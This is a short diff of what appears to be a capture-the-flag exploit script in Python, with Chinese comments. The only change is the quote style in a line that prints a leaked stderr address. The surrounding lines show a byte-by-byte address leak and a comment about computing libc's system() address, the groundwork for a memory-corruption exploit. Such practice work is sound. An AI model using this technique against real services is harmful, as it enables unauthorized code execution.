@@ -34,7 +34,7 @@ for i in range(6): # x86-64中虚拟地址实际上只有48位，所以只需要
                 io.sendlineafter(b'comments:', b'') # 发送空行，退出登录回到主页面
             break
 
-print('stderr_addr: ', hex(stderr_addr))
+print("stderr_addr: ", hex(stderr_addr))
 
 
 # 通过stderr_addr计算libc中system()的地址
